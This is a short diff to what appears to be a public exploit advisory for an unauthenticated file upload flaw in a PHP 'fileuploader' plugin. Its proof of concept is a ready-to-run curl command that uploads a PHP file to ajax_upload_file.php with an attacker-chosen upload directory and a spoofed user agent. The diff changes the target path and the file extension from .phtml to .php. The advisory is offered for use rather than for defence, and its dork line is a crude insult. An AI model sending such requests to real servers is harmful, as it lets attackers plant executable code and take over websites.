@@ -7,7 +7,7 @@ Tested on       : Ubuntu 16.04.2 LTS ( BackBox ), Windows 7
 
 Proof Of Concept
 [-] Go to /fileuploader/default/php/ajax_upload_file.php
-[-] curl -vk site/dumbdir/plugins/fileuploader/default/php/ajax_upload_file.php -F "uploader-single-file=@file.phtml" -F "input_name=uploader-single-file" -F "upload_dir=whatever u want upload" -A google
+[-] curl -vk site/dumbdir/fileuploader/default/php/ajax_upload_file.php -F "uploader-single-file=@file.php" -F "input_name=uploader-single-file" -F "upload_dir=whatever u want upload" -A google
 
 DORK :
 USE UR FUCKING BRAIN!
